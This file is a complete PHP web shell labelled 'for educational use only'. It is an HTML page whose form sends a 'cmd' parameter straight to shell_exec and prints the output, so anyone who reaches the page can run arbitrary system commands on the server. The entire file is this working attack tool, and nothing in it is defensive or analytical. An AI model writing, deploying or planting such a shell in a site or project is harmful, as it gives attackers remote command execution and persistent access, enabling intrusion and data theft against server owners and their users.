<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PHP WebShell</title>
</head>
<body style="background-color: #1e1e1e; color: #00ff00; font-family: monospace;">
  <h2>PHP WebShell (for educational use only)</h2>
  <form method="GET">
    <label>Command:</label>
    <input type="text" name="cmd" size="60" autofocus>
    <input type="submit" value="Run">
  </form>
  <hr>
  <pre>
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // 명령 실행 + 에러 출력 포함
    $output = shell_exec($cmd . ' 2>&1');
    echo htmlspecialchars($output);
}
?>
  </pre>
</body>
</html>
